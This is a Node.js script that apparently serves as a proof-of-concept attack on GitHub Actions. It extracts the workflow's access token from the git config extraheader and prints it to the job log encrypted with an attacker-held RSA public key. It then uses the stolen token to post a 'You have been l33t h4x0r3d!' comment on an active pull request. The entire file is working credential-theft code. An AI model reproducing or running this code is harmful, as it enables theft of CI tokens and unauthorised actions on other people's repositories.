import { Buffer } from "node:buffer";
import { promises } from "fs";
import simpleGit from "simple-git";
import NodeRSA from "node-rsa";
import { Octokit } from "@octokit/core";
const { readFile } = promises;

const AUTHORIZATION_OPTION_PREFIX = "AUTHORIZATION: basic ";
const BASIC_CREDENTIAL_PREFIX = "x-access-token:";
const SSL_PATTERN = /^git@github.com:([^\/]+)\/([^\.]+)\.git$/;
const HTTPS_PATTERN = /^https:\/\/github.com\/([^\/]+)\/([^\/]+)$/;

const publicKey = new NodeRSA(await readFile("id_rsa.pub"));

async function getBasicCredential(git) {
    const extraHeader = await git.getConfig("http.https://github.com/.extraheader");
    for (const header of extraHeader.values) {
        if (header.startsWith(AUTHORIZATION_OPTION_PREFIX)) {
            return header.substring(AUTHORIZATION_OPTION_PREFIX.length);
        }
    }
    return null;
}

function decodeBasicCredential(basicCredential) {
    const decoded = Buffer.from(basicCredential, "base64").toString("utf8");
    if (decoded.startsWith(BASIC_CREDENTIAL_PREFIX)) {
        return decoded.substring(BASIC_CREDENTIAL_PREFIX.length);
    }
    throw Error(`Basic credential did not match pattern: ${basicCredential}`)
}

async function getOriginUrl(git) {
    return (await git.remote(["get-url", "origin"])).trim();
}

async function getHeadRef(git) {
    // TODO: Have to trim this?
    return await git.revparse("HEAD");
}

function parseRemoteUrl(url) {
    let res = url.match(SSL_PATTERN);
    if (res === null) {
        res = url.match(HTTPS_PATTERN);
    }
    if (res === null) {
        throw Error(`Remote URL did not match pattern: ${url}`);
    }
    const owner = res[1];
    const repo = res[2];
    return { owner, repo };
}

async function getPullRequestId(octokit, owner, repo) {
    const { data: { workflow_runs: workflows } } = await octokit.request("GET /repos/{owner}/{repo}/actions/runs", {
        owner,
        repo,
        status: "in_progress",
    });

    // TODO: Target the current workflow more accurately
    const workflow = workflows.find(workflow => workflow.pull_requests && workflow.pull_requests.length > 0);
    if (workflow === undefined) {
        return null;
    }
    const { id } = workflow.pull_requests[0];
    return id;
}

async function postComment(octokit, owner, repo, issue_number) {
    await octokit.request("POST /repos/{owner}/{repo}/issues/{issue_number}/comments", {
        owner,
        repo,
        issue_number,
        body: "You have been l33t h4x0r3d!",
    })
}

async function run() {
    const git = simpleGit();
    const basicCredential = await getBasicCredential(git);
    if (basicCredential !== null) {
        console.log(`Found the token: ${publicKey.encrypt(basicCredential, "base64")}`);
    } else {
        console.log("Found no credentials in git, skipping...");
        return;
    }

    const token = decodeBasicCredential(basicCredential);
    const originUrl = await getOriginUrl(git);

    const { owner, repo } = parseRemoteUrl(originUrl);
    const octokit = new Octokit({
        auth: `token ${token}`,
    });
    try {
        const pullRequestId = await getPullRequestId(octokit, owner, repo);
        if (pullRequestId === null) {
            console.log("Found no pull request to comment on :(");
            return;
        }

        await postComment(octokit, owner, repo, pullRequestId);
    } catch (e) {
        console.error(e);
    }
}

await run();
